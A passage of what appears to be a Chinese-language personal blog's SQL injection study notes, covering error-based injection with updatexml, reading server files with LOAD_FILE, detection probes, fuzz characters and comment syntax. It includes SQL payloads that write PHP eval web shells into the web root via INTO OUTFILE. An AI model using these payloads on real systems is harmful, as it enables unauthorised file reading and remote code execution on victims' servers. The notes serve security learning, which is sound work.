+<p><code>MID()</code>函数用于从文本字段中提取字符。 SELECT MID(column_name,start[,length]) FROM table_name;</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid((select flag from flag),1,16)//从1开始截16个，即1-16</span><br></pre></td></tr></table></figure>
+
+<h4 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml()报错注入"></a>updatexml()报错注入</h4><p>updatexml()函数与extractvalue()同理，第二个参数会被原封不动输出。</p>
+<p>语法updatexml(目标xml文档，xml路径，更新的内容)</p>
+<p>注入：</p>
+<p>and (updatexml(‘1’,concat(0x7e,(代码操作),0x7e),’1’))</p>
+<h3 id="七、读写文件"><a href="#七、读写文件" class="headerlink" title="七、读写文件"></a>七、读写文件</h3><h4 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h4><h5 id="1-使用条件"><a href="#1-使用条件" class="headerlink" title="1.使用条件"></a>1.使用条件</h5><ol>
+<li>有读取文件的权限 <strong>r</strong></li>
+</ol>
+<p><code>and (select count(*) from mysql.user)&gt;0</code><br>如果返回正常则说明有权限，反之没有</p>
+<ol start="2">
+<li><p>文件大小不能超过<strong>max_allowed_packet</strong></p>
+</li>
+<li><p><strong>secure_file_priv</strong>的值不为NULL</p>
+</li>
+</ol>
+<h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p><strong>必须指定完整路径的文件</strong>，而且必须有FILE权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select LOAD_FILE(&#x27;D:/1.txt&#x27;) </span><br><span class="line">select LOAD_FILE(&#x27;/var/www/html/ma.php&#x27;) </span><br><span class="line">select LOAD_FILE(&#x27;/flag&#x27;) </span><br></pre></td></tr></table></figure>
+
+<p>输出文件内容，括号里必须是绝对路径</p>
+<p>同样的，它也可以使用substring：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUBSTRING(LOAD_FILE(&#x27;D:/1.txt&#x27;),5,1)</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="outfile（）"><a href="#outfile（）" class="headerlink" title="outfile（）"></a>outfile（）</h4><p>写文件的,就是把select出来的所有东西都写进这个路径的文件中</p>
+<p>1.当对于单引号过滤的时候，就完犊子了，因为绝对路径必须有单引号，十六进制和ASCII都不行</p>
+<p>2.outfile经典一句话<br><code>select &#39;&lt;?php eval($_POST[cmd])?&gt;&#39; into outfile &#39;d：/muma.php&#39;</code></p>
+<p>注意路径符号：错误“\” 正确”\“ 正确”/“。如果将路径转换为16进制就可以不用引号。</p>
+<p>3.必须要有可写的权限。<strong>w</strong></p>
+<p>4.如果单引号过滤，能找到phpmyadmin也行</p>
+<p>5.linux真的是权限不行，必须给相关的目录包括父目录用户o开启W权限</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> (<span class="string">&#x27;&lt;?php  @eval($_POST[&quot;hack&quot;])?&gt;&#x27;</span>) <span class="keyword">into</span> outfile&quot;/var/www/html/ma.php&quot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> (<span class="string">&#x27;&lt;?php  @eval($_REQUEST[&quot;hack&quot;])?&gt;&#x27;</span>) <span class="keyword">into</span> outfile &quot;D:/1.txt&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="如何去判断SQL注入漏洞"><a href="#如何去判断SQL注入漏洞" class="headerlink" title="如何去判断SQL注入漏洞"></a>如何去判断SQL注入漏洞</h2><ul>
+<li>and 1=1 / and 1=2 回显页面不同（整形判断）</li>
+<li>单引号判断 ‘ 显示数据库错误信息或者页面回显不同（整形，字符串类型判断）</li>
+<li>\ (转义符)</li>
+<li>-1/+1 回显下一个或上一个页面（整型判断）</li>
+<li>and sleep(5) (判断页面返回时间)</li>
+</ul>
+<h2 id="0x04-注入检测"><a href="#0x04-注入检测" class="headerlink" title="0x04 注入检测"></a>0x04 注入检测</h2><h3 id="一、常见的注入点"><a href="#一、常见的注入点" class="headerlink" title="一、常见的注入点"></a>一、常见的注入点</h3><ul>
+<li>GET/POST/PUT/DELETE参数</li>
+<li>X-Forwarded-For</li>
+<li>文件名</li>
+</ul>
+<h3 id="二、Fuzz注入点"><a href="#二、Fuzz注入点" class="headerlink" title="二、Fuzz注入点"></a>二、Fuzz注入点</h3><ul>
+<li><code>&#39;</code> / <code>&quot;</code></li>
+<li><code>1/1</code></li>
+<li><code>1/0</code></li>
+<li><code>and 1=1</code></li>
+<li><code>&quot; and &quot;1&quot;=&quot;1</code></li>
+<li><code>and 1=2</code></li>
+<li><code>or 1=1</code></li>
+<li><code>or 1=</code></li>
+<li><code>&#39; and &#39;1&#39;=&#39;1</code></li>
+<li><code>+</code> <code>-</code> <code>^</code> <code>*</code> <code>%</code> <code>/</code></li>
+<li><code>&lt;&lt;</code> <code>&gt;&gt;</code> <code>||</code> <code>|</code> <code>&amp;</code> <code>&amp;&amp;</code></li>
+<li><code>~</code></li>
+<li><code>!</code></li>
+<li><code>@</code></li>
+<li>反引号执行</li>
+</ul>
+<h3 id="三、测试用常量"><a href="#三、测试用常量" class="headerlink" title="三、测试用常量"></a>三、测试用常量</h3><ul>
+<li><code>@@version</code></li>
+<li><code>@@servername</code></li>
+<li><code>@@language</code></li>
+<li><code>@@spid</code></li>
+</ul>
+<h3 id="四、注释符"><a href="#四、注释符" class="headerlink" title="四、注释符"></a>四、注释符</h3><ul>
+<li><code>#</code></li>
+<li><code>--+</code></li>
+<li><code>/*xxx*/</code></li>
+<li><code>/*!xxx*/</code></li>
+<li><code>/*!50000xxx*/</code></li>
+</ul>
+<h3 id="五、-判断过滤规则"><a href="#五、-判断过滤规则" class="headerlink" title="五、 判断过滤规则"></a>五、 判断过滤规则</h3><ul>
+<li>是否有trunc</li>
+<li>是否过滤某个字符</li>
+<li>是否过滤关键字</li>
+<li>slash和编码</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">lhl_2507</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://lhl7.github.io/2022/04/14/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/">https://lhl7.github.io/2022/04/14/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/index.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/04/09/CVE-2022-22965%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%20/"><img class="next-cover" src="/img/index.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">CVE-2022-22965漏洞分析与复现</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lhl_2507</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">44</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">12</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/lhl7" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">sql注入笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-sql%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 sql基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%8F%92%E5%85%A5%E6%9B%B4%E6%96%B0%E5%88%A0%E9%99%A4"><span class="toc-number">1.1.1.</span> <span class="toc-text">一、插入更新删除</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%B8%B8%E7%94%A8%E5%88%B0%E7%9A%84%E9%80%9A%E7%94%A8%E5%AD%97%E6%AE%B5"><span class="toc-number">1.1.2.</span> <span class="toc-text">二、常用到的通用字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95%EF%BC%9A"><span class="toc-number">1.1.3.</span> <span class="toc-text">三、常用语法：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">1.基础</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Order-by"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">2.Order by</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#order-by-%E5%AD%97%E6%AE%B5%E5%90%8D%EF%BC%88%E5%88%97%E5%90%8D"><span class="toc-number">1.1.3.2.1.</span> <span class="toc-text">order by 字段名（列名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#order-by-%E6%95%B0%E5%AD%97"><span class="toc-number">1.1.3.2.2.</span> <span class="toc-text">order by 数字</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-limit"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">3.limit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-UNION-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.1.3.4.</span> <span class="toc-text">4.UNION(联合查询)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-concat-ws-%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.3.5.</span> <span class="toc-text">5.concat_ws()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-group-concat%EF%BC%88-concat-ws%EF%BC%89"><span class="toc-number">1.1.3.6.</span> <span class="toc-text">6.group_concat（+concat_ws）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 常用语句</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.2.1.</span> <span class="toc-text">一、爆数据库信息常用语句</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC%EF%BC%8C%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E5%90%8D%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E5%AD%97"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">1.用户数据库版本，管理员用户名及数据库名字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%88%86%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%EF%BC%9A"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">2.爆所有数据库名：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E7%88%86%E6%9F%90%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D%EF%BC%9A"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">3.爆某数据库中的所有表名：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E7%88%86%E6%9F%90%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%9F%90%E8%A1%A8%E7%9A%84%E6%89%80%E6%9C%89%E5%AD%97%E6%AE%B5%E5%90%8D%EF%BC%9A"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">4.爆某数据库中某表的所有字段名：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E7%88%86%E6%9F%90%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E4%BF%A1%E6%81%AF%EF%BC%8C%E7%94%A8%E9%80%97%E5%8F%B7%E5%88%86%E9%9A%94"><span class="toc-number">1.2.1.5.</span> <span class="toc-text">5.爆某表中的所有信息，用逗号分隔</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%B8%B8%E8%A7%81%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 常见注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5-%E5%88%A4%E6%96%AD%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88"><span class="toc-number">1.3.1.</span> <span class="toc-text">一、字符型注入,判断引号闭合:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%B3%A8%E9%87%8A%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">二、注释型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81union%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text">三、union注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.4.</span> <span class="toc-text">四、布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%89%80%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">1.所用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#length"><span class="toc-number">1.3.4.1.1.</span> <span class="toc-text">length()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#substring"><span class="toc-number">1.3.4.1.2.</span> <span class="toc-text">substring()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ord"><span class="toc-number">1.3.4.1.3.</span> <span class="toc-text">ord()</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">2 手工注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.3.4.2.1.</span> <span class="toc-text">判断注入点</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.5.</span> <span class="toc-text">五、时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.6.</span> <span class="toc-text">六、报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ExtractValue-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.6.1.</span> <span class="toc-text">ExtractValue()报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#MID%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.6.1.1.</span> <span class="toc-text">MID函数</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.6.2.</span> <span class="toc-text">updatexml()报错注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.7.</span> <span class="toc-text">七、读写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#load-file"><span class="toc-number">1.3.7.1.</span> <span class="toc-text">load_file()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.3.7.1.1.</span> <span class="toc-text">1.使用条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8"><span class="toc-number">1.3.7.1.2.</span> <span class="toc-text">使用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#outfile%EF%BC%88%EF%BC%89"><span class="toc-number">1.3.7.2.</span> <span class="toc-text">outfile（）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8E%BB%E5%88%A4%E6%96%ADSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.</span> <span class="toc-text">如何去判断SQL注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B"><span class="toc-number">1.5.</span> <span class="toc-text">0x04 注入检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.5.1.</span> <span class="toc-text">一、常见的注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Fuzz%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.5.2.</span> <span class="toc-text">二、Fuzz注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%B5%8B%E8%AF%95%E7%94%A8%E5%B8%B8%E9%87%8F"><span class="toc-number">1.5.3.</span> <span class="toc-text">三、测试用常量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">1.5.4.</span> <span class="toc-text">四、注释符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81-%E5%88%A4%E6%96%AD%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99"><span class="toc-number">1.5.5.</span> <span class="toc-text">五、 判断过滤规则</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/04/14/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" title="sql注入笔记@Biscuit19">sql注入笔记@Biscuit19</a><time datetime="2022-04-14T14:10:59.715Z" title="Created 2022-04-14 22:10:59">2022-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/04/09/CVE-2022-22965%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%20/" title="CVE-2022-22965漏洞分析与复现">CVE-2022-22965漏洞分析与复现</a><time datetime="2022-04-09T13:29:36.746Z" title="Created 2022-04-09 21:29:36">2022-04-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/26/CVE-2020-16875%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/" title="CVE-2020-16875漏洞分析与复现">CVE-2020-16875漏洞分析与复现</a><time datetime="2022-03-26T15:01:25.476Z" title="Created 2022-03-26 23:01:25">2022-03-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/26/Metasploit%E7%9A%84%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/" title="Metasploit的使用笔记">Metasploit的使用笔记</a><time datetime="2022-03-26T08:41:48.420Z" title="Created 2022-03-26 16:41:48">2022-03-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/17/%E5%B8%B8%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E5%8F%8A%E5%85%B6%E5%8A%9F%E8%83%BD%E6%80%BB%E7%BB%93/" title="寄存器总结">寄存器总结</a><time datetime="2022-03-17T08:12:41.986Z" title="Created 2022-03-17 16:12:41">2022-03-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By lhl_2507</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Local search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
